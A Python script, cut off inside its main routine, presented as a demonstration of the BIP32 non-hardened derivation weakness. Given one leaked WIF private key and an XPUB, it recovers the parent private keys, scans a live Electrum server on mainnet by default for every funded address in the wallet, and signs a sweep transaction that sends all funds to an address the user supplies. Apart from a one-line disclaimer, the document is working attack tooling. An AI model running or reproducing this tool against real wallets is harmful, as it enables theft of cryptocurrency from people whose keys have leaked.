#!/usr/bin/env python3
"""
xpub_wif_sweep.py — Demonstration of the BIP32 non-hardened derivation vulnerability.

If an attacker has the WIF of ANY address derived from an XPUB, they can
recover the parent extended private key and sweep ALL funds from the tree.

WARNING: For security research and test environments only.
DO NOT broadcast without authorization from the wallet owner.
"""

import hashlib
import hmac
import json
import math
import socket
import ssl
import struct
import sys
from dataclasses import dataclass, field
from typing import Optional

# ─── secp256k1 constants ──────────────────────────────────────────────────────

SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
SECP256K1_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
SECP256K1_Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
SECP256K1_Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
SECP256K1_G = (SECP256K1_Gx, SECP256K1_Gy)

BASE58_ALPHABET = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

XPUB_VERSION_BYTES = {
    # mainnet
    b"\x04\x88\xb2\x1e": "mainnet",  # xpub
    b"\x04\x9d\x7c\xb2": "mainnet",  # ypub (P2SH-P2WPKH)
    b"\x04\xb2\x47\x46": "mainnet",  # zpub (P2WPKH)
    # testnet
    b"\x04\x35\x87\xcf": "testnet",  # tpub
    b"\x04\x4a\x52\x62": "testnet",  # upub
    b"\x04\x5f\x1c\xf6": "testnet",  # vpub
}


# ─── Cryptographic primitives ─────────────────────────────────────────────────

def dsha256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def _ripemd160(data: bytes) -> bytes:
    """Pure-Python RIPEMD-160 (for environments with OpenSSL 3.0+ that disables RIPEMD160)."""
    # Try via hashlib first (faster)
    for kwargs in [{}, {"usedforsecurity": False}]:
        try:
            return hashlib.new("ripemd160", data, **kwargs).digest()
        except (ValueError, TypeError):
            pass
    # Pure RIPEMD-160 implementation
    KL = [0x00000000, 0x5A827999, 0x6ED9EBA1, 0x8F1BBCDC, 0xA953FD4E]
    KR = [0x50A28BE6, 0x5C4DD124, 0x6D703EF3, 0x7A6D76E9, 0x00000000]
    RL = [
        0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
        7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,
        3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,
        1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,
        4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13,
    ]
    RR = [
        5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,
        6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,
        15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,
        8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,
        12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11,
    ]
    SL = [
        11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,
        7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,
        11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,
        11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,
        9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6,
    ]
    SR = [
        8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,
        9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,
        9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,
        15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,
        8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11,
    ]

    def rol32(x, n):
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

    def f(j, x, y, z):
        if j < 16:   return (x ^ y ^ z) & 0xFFFFFFFF
        elif j < 32: return ((x & y) | (~x & z)) & 0xFFFFFFFF
        elif j < 48: return ((x | ~y) ^ z) & 0xFFFFFFFF
        elif j < 64: return ((x & z) | (y & ~z)) & 0xFFFFFFFF
        else:        return (x ^ (y | ~z)) & 0xFFFFFFFF

    # Padding
    msg = bytearray(data)
    orig_len = len(data) * 8
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", orig_len)

    h0, h1, h2, h3, h4 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0

    for blk in range(0, len(msg), 64):
        X = list(struct.unpack_from("<16I", msg, blk))
        al, bl, cl, dl, el = h0, h1, h2, h3, h4
        ar, br, cr, dr, er = h0, h1, h2, h3, h4
        for j in range(80):
            T = (al + f(j, bl, cl, dl) + X[RL[j]] + KL[j // 16]) & 0xFFFFFFFF
            T = (rol32(T, SL[j]) + el) & 0xFFFFFFFF
            al, bl, cl, dl, el = el, T, bl, rol32(cl, 10), dl
            T = (ar + f(79 - j, br, cr, dr) + X[RR[j]] + KR[j // 16]) & 0xFFFFFFFF
            T = (rol32(T, SR[j]) + er) & 0xFFFFFFFF
            ar, br, cr, dr, er = er, T, br, rol32(cr, 10), dr
        T = (h1 + cl + dr) & 0xFFFFFFFF
        h1 = (h2 + dl + er) & 0xFFFFFFFF
        h2 = (h3 + el + ar) & 0xFFFFFFFF
        h3 = (h4 + al + br) & 0xFFFFFFFF
        h4 = (h0 + bl + cr) & 0xFFFFFFFF
        h0 = T
    return struct.pack("<5I", h0, h1, h2, h3, h4)


def hash160(data: bytes) -> bytes:
    return _ripemd160(hashlib.sha256(data).digest())


def hmac_sha512(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha512).digest()


def base58check_decode(s: str) -> bytes:
    """Decode Base58Check → payload (without checksum)."""
    n = 0
    for c in s.encode():
        n = n * 58 + BASE58_ALPHABET.index(c)
    result = n.to_bytes(82, "big").lstrip(b"\x00")
    # Leading zero bytes
    leading = len(s) - len(s.lstrip("1"))
    result = b"\x00" * leading + result
    payload, checksum = result[:-4], result[-4:]
    if dsha256(payload)[:4] != checksum:
        raise ValueError("Invalid Base58Check checksum")
    return payload


def base58check_encode(payload: bytes) -> str:
    checksum = dsha256(payload)[:4]
    data = payload + checksum
    n = int.from_bytes(data, "big")
    result = []
    while n:
        n, r = divmod(n, 58)
        result.append(BASE58_ALPHABET[r:r+1])
    result.reverse()
    leading = len(data) - len(data.lstrip(b"\x00"))
    return (b"1" * leading + b"".join(result)).decode()


# ─── secp256k1 elliptic curve arithmetic ──────────────────────────────────────

def _mod_inv(a: int, m: int) -> int:
    return pow(a, m - 2, m)


def _point_add(P, Q):
    if P is None:
        return Q
    if Q is None:
        return P
    if P[0] == Q[0]:
        if P[1] != Q[1]:
            return None
        # Point doubling
        lam = (3 * P[0] * P[0] * _mod_inv(2 * P[1], SECP256K1_P)) % SECP256K1_P
    else:
        lam = ((Q[1] - P[1]) * _mod_inv(Q[0] - P[0], SECP256K1_P)) % SECP256K1_P
    x = (lam * lam - P[0] - Q[0]) % SECP256K1_P
    y = (lam * (P[0] - x) - P[1]) % SECP256K1_P
    return (x, y)


def _point_mul(k: int, P=None) -> tuple:
    if P is None:
        P = SECP256K1_G
    R = None
    while k:
        if k & 1:
            R = _point_add(R, P)
        P = _point_add(P, P)
        k >>= 1
    return R


def privkey_to_pubkey(privkey: bytes) -> bytes:
    """Private key (32 bytes) → compressed pubkey (33 bytes)."""
    k = int.from_bytes(privkey, "big")
    x, y = _point_mul(k)
    prefix = b"\x02" if y % 2 == 0 else b"\x03"
    return prefix + x.to_bytes(32, "big")


def pubkey_from_compressed(pubkey33: bytes) -> tuple:
    """Compressed pubkey → point (x, y)."""
    prefix = pubkey33[0]
    x = int.from_bytes(pubkey33[1:], "big")
    y_sq = (pow(x, 3, SECP256K1_P) + 7) % SECP256K1_P
    y = pow(y_sq, (SECP256K1_P + 1) // 4, SECP256K1_P)
    if (y % 2 == 0) != (prefix == 0x02):
        y = SECP256K1_P - y
    return (x, y)


# ─── BIP32 ────────────────────────────────────────────────────────────────────

@dataclass
class XPubInfo:
    version: bytes
    depth: int
    parent_fingerprint: bytes
    child_index: int
    chain_code: bytes
    pubkey: bytes  # 33 bytes compressed
    network: str   # "mainnet" or "testnet"


def parse_xpub(xpub_str: str) -> XPubInfo:
    raw = base58check_decode(xpub_str)
    if len(raw) != 78:
        raise ValueError(f"XPUB has unexpected length: {len(raw)}")
    version = raw[:4]
    network = XPUB_VERSION_BYTES.get(version)
    if network is None:
        raise ValueError(f"Unrecognized XPUB version: {version.hex()}")
    depth = raw[4]
    parent_fp = raw[5:9]
    child_idx = struct.unpack(">I", raw[9:13])[0]
    chain_code = raw[13:45]
    pubkey = raw[45:78]
    return XPubInfo(version, depth, parent_fp, child_idx, chain_code, pubkey, network)


def parse_wif(wif_str: str) -> tuple[bytes, bool]:
    """WIF → (privkey_32_bytes, compressed)."""
    raw = base58check_decode(wif_str)
    if raw[0] not in (0x80, 0xEF):
        raise ValueError(f"Unknown WIF prefix: 0x{raw[0]:02x}")
    if len(raw) == 34 and raw[-1] == 0x01:
        return raw[1:33], True
    elif len(raw) == 33:
        return raw[1:33], False
    else:
        raise ValueError(f"Unexpected WIF length: {len(raw)}")


def ckd_pub(K_par: bytes, c_par: bytes, index: int) -> tuple[bytes, bytes]:
    """BIP32 non-hardened public derivation. Returns (K_child_33, c_child_32)."""
    if index >= 0x80000000:
        raise ValueError("ckd_pub does not support hardened indexes")
    I = hmac_sha512(c_par, K_par + struct.pack(">I", index))
    IL, IR = I[:32], I[32:]
    IL_int = int.from_bytes(IL, "big")
    if IL_int >= SECP256K1_N:
        raise ValueError("IL >= n, invalid index")
    # K_child = point(IL) + K_par
    K_par_point = pubkey_from_compressed(K_par)
    IL_point = _point_mul(IL_int)
    K_child_point = _point_add(IL_point, K_par_point)
    if K_child_point is None:
        raise ValueError("Point at infinity, invalid index")
    x, y = K_child_point
    prefix = b"\x02" if y % 2 == 0 else b"\x03"
    K_child = prefix + x.to_bytes(32, "big")
    return K_child, IR


def ckd_priv(k_par: bytes, c_par: bytes, index: int) -> tuple[bytes, bytes]:
    """BIP32 private derivation. Returns (k_child_32, c_child_32)."""
    K_par = privkey_to_pubkey(k_par)
    if index >= 0x80000000:
        data = b"\x00" + k_par + struct.pack(">I", index)
    else:
        data = K_par + struct.pack(">I", index)
    I = hmac_sha512(c_par, data)
    IL, IR = I[:32], I[32:]
    IL_int = int.from_bytes(IL, "big")
    k_par_int = int.from_bytes(k_par, "big")
    k_child_int = (IL_int + k_par_int) % SECP256K1_N
    if k_child_int == 0:
        raise ValueError("k_child == 0, invalid index")
    return k_child_int.to_bytes(32, "big"), IR


def recover_parent_privkey(k_child: bytes, K_parent: bytes, c_parent: bytes, index: int) -> bytes:
    """
    Core operation of the BIP32 non-hardened vulnerability:
    Given k_child = k_parent + HMAC(c_parent || K_parent || i)[0:32]
    Recover k_parent = k_child - IL  (mod n)
    """
    I = hmac_sha512(c_parent, K_parent + struct.pack(">I", index))
    IL_int = int.from_bytes(I[:32], "big")
    k_child_int = int.from_bytes(k_child, "big")
    k_parent_int = (k_child_int - IL_int) % SECP256K1_N
    k_parent = k_parent_int.to_bytes(32, "big")
    # Verify: the recovered point must match K_parent
    recovered_pub = privkey_to_pubkey(k_parent)
    if recovered_pub != K_parent:
        raise ValueError(
            "Verification failed: recovered pubkey does not match K_parent.\n"
            "Make sure the WIF corresponds to the provided XPUB."
        )
    return k_parent


# ─── Addresses ────────────────────────────────────────────────────────────────

def pubkey_to_p2wpkh_spk(pubkey33: bytes) -> bytes:
    """P2WPKH scriptPubKey: OP_0 <hash160(pubkey)>"""
    h = hash160(pubkey33)
    return b"\x00\x14" + h


def bech32_encode(hrp: str, data: bytes) -> str:
    """Encode P2WPKH address in bech32 (segwit v0)."""
    CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

    def bech32_polymod(values):
        GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
        chk = 1
        for v in values:
            b = chk >> 25
            chk = (chk & 0x1ffffff) << 5 ^ v
            for i in range(5):
                chk ^= GEN[i] if ((b >> i) & 1) else 0
        return chk

    def convertbits(data, frombits, tobits, pad=True):
        acc, bits, ret, maxv = 0, 0, [], (1 << tobits) - 1
        for value in data:
            acc = ((acc << frombits) | value) & ((1 << (frombits + tobits - 1)) - 1)
            bits += frombits
            while bits >= tobits:
                bits -= tobits
                ret.append((acc >> bits) & maxv)
        if pad and bits:
            ret.append((acc << (tobits - bits)) & maxv)
        elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
            return None
        return ret

    witver = 0
    witprog = list(data)
    enc = convertbits([witver] + witprog, 8, 5)  # witver is already 5 bits
    # witver as 5-bit
    data5 = [witver] + convertbits(witprog, 8, 5)
    hrp_bytes = [ord(c) for c in hrp]
    combined = hrp_bytes + [0] + data5 + [0, 0, 0, 0, 0, 0]
    polymod = bech32_polymod(
        [c >> 5 for c in hrp_bytes] + [0] + [c & 31 for c in hrp_bytes] + [0] + data5 + [0, 0, 0, 0, 0, 0]
    ) ^ 1
    checksum = [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]
    return hrp + "1" + "".join([CHARSET[d] for d in data5 + checksum])


def spk_to_address(spk: bytes, network: str) -> str:
    """P2WPKH scriptPubKey → bech32 address."""
    if spk[0] == 0x00 and spk[1] == 0x14:
        hrp = "bc" if network == "mainnet" else "tb"
        return bech32_encode(hrp, spk[2:])
    raise ValueError(f"Only P2WPKH supported. scriptPubKey: {spk.hex()}")


def scripthash_for_electrum(spk: bytes) -> str:
    """Electrum script hash: SHA256(spk) reversed."""
    return hashlib.sha256(spk).digest()[::-1].hex()


# ─── Electrum client ──────────────────────────────────────────────────────────

class ElectrumClient:
    def __init__(self, url: str):
        self.url = url
        self._sock = None
        self._req_id = 0
        self._buf = b""

    def connect(self):
        if self.url.startswith("ssl://"):
            host_port = self.url[6:]
            host, port = (host_port.rsplit(":", 1) if ":" in host_port else (host_port, "50002"))
            port = int(port)
            raw = socket.create_connection((host, port), timeout=20)
            ctx = ssl.create_default_context()
            self._sock = ctx.wrap_socket(raw, server_hostname=host)
        elif self.url.startswith("tcp://"):
            host_port = self.url[6:]
            host, port = (host_port.rsplit(":", 1) if ":" in host_port else (host_port, "50001"))
            port = int(port)
            self._sock = socket.create_connection((host, port), timeout=20)
        else:
            raise ValueError("electrum-url must start with ssl:// or tcp://")
        # Handshake
        self.call("server.version", ["xpub_sweep/1.0", "1.4"])

    def call(self, method: str, params: list):
        self._req_id += 1
        msg = json.dumps({"id": self._req_id, "method": method, "params": params}) + "\n"
        self._sock.sendall(msg.encode())
        while True:
            chunk = self._sock.recv(4096)
            if not chunk:
                raise ConnectionError("Electrum connection closed unexpectedly")
            self._buf += chunk
            if b"\n" in self._buf:
                line, self._buf = self._buf.split(b"\n", 1)
                resp = json.loads(line.decode())
                if "error" in resp and resp["error"]:
                    raise RuntimeError(f"Electrum error: {resp['error']}")
                return resp.get("result")

    def listunspent(self, scripthash: str) -> list:
        return self.call("blockchain.scripthash.listunspent", [scripthash]) or []

    def get_history(self, scripthash: str) -> list:
        return self.call("blockchain.scripthash.get_history", [scripthash]) or []

    def get_tx(self, txid: str) -> str:
        return self.call("blockchain.transaction.get", [txid])

    def close(self):
        if self._sock:
            self._sock.close()


# ─── Fund discovery ───────────────────────────────────────────────────────────

@dataclass
class SweepInput:
    txid: str
    vout: int
    value_sat: int
    privkey: bytes
    pubkey: bytes
    spk: bytes


def find_wif_index_in_xpub(
    wif_pubkey: bytes,
    xpub: XPubInfo,
    gap_limit: int,
    verbose: bool = False,
) -> dict:
    """
    Locates the WIF in the XPUB tree. Automatically detects the level.
    Returns dict with: xpub_level, chain, index, parent_pubkey, parent_chain_code.
    """
    K, c = xpub.pubkey, xpub.chain_code

    # Case A: account-level XPUB → search xpub/0/i and xpub/1/i
    for chain in (0, 1):
        if verbose:
            print(f"  Searching xpub/{chain}/0..{gap_limit-1}...")
        K_chain, c_chain = ckd_pub(K, c, chain)
        for i in range(gap_limit):
            K_child, _ = ckd_pub(K_chain, c_chain, i)
            if K_child == wif_pubkey:
                return {
                    "xpub_level": "account",
                    "chain": chain,
                    "index": i,
                    "parent_pubkey": K_chain,
                    "parent_chain_code": c_chain,
                }

    # Case B: chain-level XPUB → search xpub/i directly
    if verbose:
        print(f"  Searching xpub/0..{gap_limit-1} (chain-level)...")
    for i in range(gap_limit):
        K_child, _ = ckd_pub(K, c, i)
        if K_child == wif_pubkey:
            return {
                "xpub_level": "chain",
                "chain": None,
                "index": i,
                "parent_pubkey": K,
                "parent_chain_code": c,
            }

    raise ValueError(
        f"WIF pubkey not found in the XPUB tree (gap_limit={gap_limit}).\n"
        "Verify that --wif and --xpub belong to the same wallet, "
        "or increase --gap-limit."
    )


def recover_keys_from_match(wif_privkey: bytes, match: dict, xpub: XPubInfo) -> tuple[bytes, bytes, bytes, bytes]:
    """
    Recovers (k_ext_chain, c_ext_chain, k_int_chain, c_int_chain)
    using the BIP32 inversion from the found match.
    """
    level = match["xpub_level"]
    k_parent_chain = recover_parent_privkey(
        wif_privkey,
        match["parent_pubkey"],
        match["parent_chain_code"],
        match["index"],
    )

    if level == "chain":
        # The xpub IS the chain. We only have one chain.
        return k_parent_chain, match["parent_chain_code"], None, None

    # level == "account": k_parent_chain is chain 0 or 1.
    # We need the account private key to derive the other chain.
    found_chain = match["chain"]

    # Second inversion: recover k_account from k_chain_{found_chain}
    k_account = recover_parent_privkey(
        k_parent_chain,
        xpub.pubkey,
        xpub.chain_code,
        found_chain,
    )

    # Derive both chains from the account
    k_ext, c_ext = ckd_priv(k_account, xpub.chain_code, 0)
    k_int, c_int = ckd_priv(k_account, xpub.chain_code, 1)
    return k_ext, c_ext, k_int, c_int


@dataclass
class AddrBalance:
    address: str
    chain_label: str
    index: int
    utxos: list
    total_sat: int


def discover_utxos(
    k_chain: bytes,
    c_chain: bytes,
    electrum: ElectrumClient,
    network: str,
    gap_limit: int,
    chain_label: str,
) -> tuple[list[SweepInput], list[AddrBalance]]:
    """Discovers all UTXOs on a chain by deriving with gap limit.
    Returns (inputs_for_sweep, balances_per_address)."""
    inputs = []
    balances = []
    consecutive_empty = 0
    index = 0

    while consecutive_empty < gap_limit:
        k_addr, _ = ckd_priv(k_chain, c_chain, index)
        pub = privkey_to_pubkey(k_addr)
        spk = pubkey_to_p2wpkh_spk(pub)
        sh = scripthash_for_electrum(spk)

        history = electrum.get_history(sh)
        if history:
            consecutive_empty = 0
            utxos = electrum.listunspent(sh)
            addr = spk_to_address(spk, network)
            if utxos:
                total = sum(u["value"] for u in utxos)
                balances.append(AddrBalance(addr, chain_label, index, utxos, total))
                for u in utxos:
                    inputs.append(SweepInput(
                        txid=u["tx_hash"],
                        vout=u["tx_pos"],
                        value_sat=u["value"],
                        privkey=k_addr,
                        pubkey=pub,
                        spk=spk,
                    ))
        else:
            consecutive_empty += 1

        index += 1

    return inputs, balances


# ─── Transaction construction and signing ─────────────────────────────────────

def encode_varint(n: int) -> bytes:
    if n < 0xfd:
        return bytes([n])
    elif n <= 0xffff:
        return b"\xfd" + struct.pack("<H", n)
    elif n <= 0xffffffff:
        return b"\xfe" + struct.pack("<I", n)
    else:
        return b"\xff" + struct.pack("<Q", n)


def estimate_fee(n_inputs: int, dest_spk: bytes, fee_rate_sat_vb: float) -> int:
    """Fee estimate for N P2WPKH inputs and 1 output."""
    overhead = 10.5  # segwit overhead
    per_input = 68.0  # P2WPKH input vbytes
    output_vb = 9 + len(dest_spk)
    total_vb = overhead + n_inputs * per_input + output_vb
    return math.ceil(total_vb * fee_rate_sat_vb)


def build_sighash_bip143(
    inputs: list[SweepInput],
    outputs_serialized: bytes,
    input_index: int,
    sequence: int,
    nversion: int,
    nlocktime: int,
) -> bytes:
    """Compute the BIP143 sighash for a P2WPKH input."""
    inp = inputs[input_index]

    # hashPrevouts
    prevouts = b""
    for i in inputs:
        prevouts += bytes.fromhex(i.txid)[::-1] + struct.pack("<I", i.vout)
    hash_prevouts = dsha256(prevouts)

    # hashSequence
    seqs = b"".join(struct.pack("<I", sequence) for _ in inputs)
    hash_sequence = dsha256(seqs)

    # hashOutputs
    hash_outputs = dsha256(outputs_serialized)

    # scriptCode for P2WPKH
    h160 = hash160(inp.pubkey)
    scriptcode = bytes([0x19, 0x76, 0xa9, 0x14]) + h160 + bytes([0x88, 0xac])

    preimage = (
        struct.pack("<I", nversion)
        + hash_prevouts
        + hash_sequence
        + bytes.fromhex(inp.txid)[::-1] + struct.pack("<I", inp.vout)
        + scriptcode
        + struct.pack("<Q", inp.value_sat)
        + struct.pack("<I", sequence)
        + hash_outputs
        + struct.pack("<I", nlocktime)
        + struct.pack("<I", 1)  # SIGHASH_ALL
    )
    return dsha256(preimage)


def sign_ecdsa(privkey: bytes, msg_hash: bytes) -> bytes:
    """Deterministic ECDSA signature (RFC 6979 via Python). Returns DER + SIGHASH_ALL."""
    # Use coincurve if available, fall back to pure implementation
    try:
        import coincurve
        key = coincurve.PrivateKey(privkey)
        sig = key.sign(msg_hash, hasher=None)
        return sig + b"\x01"
    except ImportError:
        pass

    # Pure RFC 6979 implementation (deterministic k)
    def bits2int(b):
        v = int.from_bytes(b, "big")
        vlen = len(b) * 8
        if vlen > 256:
            v >>= vlen - 256
        return v

    def int2octets(x):
        return x.to_bytes(32, "big")

    def bits2octets(b):
        z1 = bits2int(b)
        z2 = z1 % SECP256K1_N
        return int2octets(z2)

    # RFC 6979 k generation
    h1 = msg_hash
    V = b"\x01" * 32
    K = b"\x00" * 32
    K = hmac.new(K, V + b"\x00" + privkey + bits2octets(h1), hashlib.sha256).digest()
    V = hmac.new(K, V, hashlib.sha256).digest()
    K = hmac.new(K, V + b"\x01" + privkey + bits2octets(h1), hashlib.sha256).digest()
    V = hmac.new(K, V, hashlib.sha256).digest()

    while True:
        V = hmac.new(K, V, hashlib.sha256).digest()
        k_int = bits2int(V)
        if 1 <= k_int < SECP256K1_N:
            break
        K = hmac.new(K, V + b"\x00", hashlib.sha256).digest()
        V = hmac.new(K, V, hashlib.sha256).digest()

    # ECDSA signature
    Rx, _ = _point_mul(k_int)
    r = Rx % SECP256K1_N
    if r == 0:
        raise ValueError("r == 0 in ECDSA signature")
    z = int.from_bytes(msg_hash, "big")
    k_inv = pow(k_int, SECP256K1_N - 2, SECP256K1_N)
    d = int.from_bytes(privkey, "big")
    s = (k_inv * (z + r * d)) % SECP256K1_N
    if s == 0:
        raise ValueError("s == 0 in ECDSA signature")
    # Normalize s (BIP146)
    if s > SECP256K1_N // 2:
        s = SECP256K1_N - s

    # DER encode
    def encode_der_int(n):
        b = n.to_bytes(32, "big").lstrip(b"\x00")
        if b[0] & 0x80:
            b = b"\x00" + b
        return bytes([0x02, len(b)]) + b

    r_enc = encode_der_int(r)
    s_enc = encode_der_int(s)
    der = bytes([0x30, len(r_enc) + len(s_enc)]) + r_enc + s_enc
    return der + b"\x01"


def serialize_tx(inputs: list[SweepInput], output_spk: bytes, output_value: int, witnesses: list[list[bytes]]) -> bytes:
    """Serialize a segwit transaction (BIP141)."""
    SEQUENCE = 0xFFFFFFFD  # RBF
    NVERSION = 2
    NLOCKTIME = 0

    out = b""
    out += struct.pack("<I", NVERSION)
    # Segwit marker + flag
    out += b"\x00\x01"
    # Inputs
    out += encode_varint(len(inputs))
    for inp in inputs:
        out += bytes.fromhex(inp.txid)[::-1]
        out += struct.pack("<I", inp.vout)
        out += b"\x00"  # empty scriptSig (P2WPKH)
        out += struct.pack("<I", SEQUENCE)
    # Outputs
    out += encode_varint(1)
    out += struct.pack("<Q", output_value)
    out += encode_varint(len(output_spk))
    out += output_spk
    # Witnesses
    for witness in witnesses:
        out += encode_varint(len(witness))
        for item in witness:
            out += encode_varint(len(item))
            out += item
    out += struct.pack("<I", NLOCKTIME)
    return out


def compute_txid(inputs: list[SweepInput], output_spk: bytes, output_value: int) -> str:
    """TXID is computed over the legacy serialization (without witness)."""
    SEQUENCE = 0xFFFFFFFD
    NVERSION = 2
    NLOCKTIME = 0

    out = struct.pack("<I", NVERSION)
    out += encode_varint(len(inputs))
    for inp in inputs:
        out += bytes.fromhex(inp.txid)[::-1]
        out += struct.pack("<I", inp.vout)
        out += b"\x00"
        out += struct.pack("<I", SEQUENCE)
    out += encode_varint(1)
    out += struct.pack("<Q", output_value)
    out += encode_varint(len(output_spk))
    out += output_spk
    out += struct.pack("<I", NLOCKTIME)
    return dsha256(out)[::-1].hex()


# ─── Destination address → scriptPubKey ──────────────────────────────────────

def address_to_spk(address: str) -> bytes:
    """bech32/base58 address → scriptPubKey."""
    # P2PKH / P2SH (base58)
    if address[0] in ("1", "3", "m", "n", "2"):
        raw = base58check_decode(address)
        version, h = raw[0], raw[1:]
        if version in (0x00, 0x6f):  # P2PKH mainnet/testnet
            return b"\x76\xa9\x14" + h + b"\x88\xac"
        elif version in (0x05, 0xc4):  # P2SH mainnet/testnet
            return b"\xa9\x14" + h + b"\x87"
        raise ValueError(f"Unrecognized base58 version: {version}")
    # P2WPKH / P2WSH (bech32)
    if address.startswith(("bc1", "tb1", "bcrt1")):
        # Simplified bech32 decoding for P2WPKH (20 bytes)
        CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
        addr = address.lower()
        pos = addr.rfind("1")
        hrp = addr[:pos]
        data = [CHARSET.index(c) for c in addr[pos+1:]]
        # Convert from 5-bit to 8-bit
        acc, bits, result = 0, 0, []
        for val in data[1:-6]:  # skip witver and checksum
            acc = ((acc << 5) | val) & 0xfff
            bits += 5
            if bits >= 8:
                bits -= 8
                result.append((acc >> bits) & 0xff)
        witprog = bytes(result)
        witver = data[0]
        if witver == 0 and len(witprog) == 20:
            return b"\x00\x14" + witprog
        elif witver == 0 and len(witprog) == 32:
            return b"\x00\x20" + witprog
        raise ValueError(f"Unrecognized witness program: ver={witver}, len={len(witprog)}")
    raise ValueError(f"Unrecognized address format: {address}")


# ─── Interactive helpers ───────────────────────────────────────────────────────

def ask(prompt: str, default: str = "") -> str:
    """Prompt for input. Shows default in brackets if provided."""
    if default:
        display = f"{prompt} [{default}]: "
    else:
        display = f"{prompt}: "
    while True:
        val = input(display).strip()
        if val:
            return val
        if default:
            return default
        print("  (required)")


def ask_float(prompt: str, default: float) -> float:
    while True:
        raw = ask(prompt, str(default))
        try:
            return float(raw)
        except ValueError:
            print("  Enter a valid decimal number.")


def ask_int(prompt: str, default: int) -> int:
    while True:
        raw = ask(prompt, str(default))
        try:
            return int(raw)
        except ValueError:
            print("  Enter a valid integer.")


def print_sep():
    print("─" * 60)


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print("║  xpub_wif_sweep — BIP32 vulnerability demonstration     ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print("WARNING: for security research only.")
    print("DO NOT broadcast without authorization from the wallet owner.\n")

    # ── Parameters ──────────────────────────────────────────────
    print_sep()
    print("PARAMETERS")
    print_sep()
    wif_str      = ask("WIF (private key of any address in the wallet)")
    xpub_str     = ask("XPUB (account-level or chain-level)")
    destination  = ask("Destination address for the sweep")
    electrum_url = ask("Electrum URL", "ssl://electrum.blockstream.info:50002")
    network      = ask("Network (mainnet/testnet/signet)", "mainnet")
    fee_rate     = ask_float("Fee rate (sat/vB)", 5.0)
    gap_limit    = ask_int("Gap limit", 50)

    # ── Validate and parse ───────────────────────────────────────
    print()
    print_sep()
    print("VALIDATING INPUTS")
    print_sep()

    try:
        xpub = parse_xpub(xpub_str)
    except Exception as e:
        print(f"[!] Invalid XPUB: {e}")
        sys.exit(1)
    print(f"  Detected XPUB network: {xpub.network}")

    try:
        wif_privkey, compressed = parse_wif(wif_str)
    except Exception as e:
        print(f"[!] Invalid WIF: {e}")
        sys.exit(1)
    if not compressed:
        print("  [!] Uncompressed WIF — P2WPKH may not match")

    try:
        dest_spk = address_to_spk(destination)
    except Exception as e:
        print(f"[!] Invalid destination address: {e}")
        sys.exit(1)
    print(f"  Destination address: {destination}")
    print(f"  Fee rate: {fee_rate} sat/vB  |  Gap limit: {gap_limit}")

    wif_pubkey = privkey_to_pubkey(wif_privkey)

    # ── Locate WIF in the tree ───────────────────────────────────
    print()
    print_sep()
    print("LOCATING WIF IN THE XPUB TREE")
    print_sep()

    try:
        match = find_wif_index_in_xpub(wif_pubkey, xpub, gap_limit, verbose=True)
    except ValueError as e:
        print(f"[!] {e}")
        sys.exit(1)
    print(f"  Level: {match['xpub_level']}  |  Chain: {match['chain']}  |  Index: {match['index']}")

    # ── Recover keys ─────────────────────────────────────────────
    print()
    print_sep()
    print("RECOVERING PRIVATE KEYS")
    print_sep()

    try:
        k_ext, c_ext, k_int, c_int = recover_keys_from_match(wif_privkey, match, xpub)
    except ValueError as e:
        print(f"[!] {e}")
        sys.exit(1)

    if match["xpub_level"] == "account":
        print("  Account private key recovered and verified ✓")
        print("  External (receive) and internal (change) chains derived ✓")
    else:
        print("  Chain private key recovered and verified ✓")

    # ── Connect to Electrum and discover UTXOs ───────────────────
    print()
    print_sep()
    print("DISCOVERING FUNDS VIA ELECTRUM")
    print_sep()
    print(f"  Connecting to {electrum_url} ...")

    try:
        electrum = ElectrumClient(electrum_url)
        electrum.connect()
    except Exception as e:
        print(f"[!] Error connecting to Electrum: {e}")
        sys.exit(1)
    print("  Connected ✓\n")

    all_inputs: list[SweepInput] = []
    all_balances: list[AddrBalance] = []

    try:
        if match["xpub_level"] == "account":
            print("  Scanning external chain (receive)...")
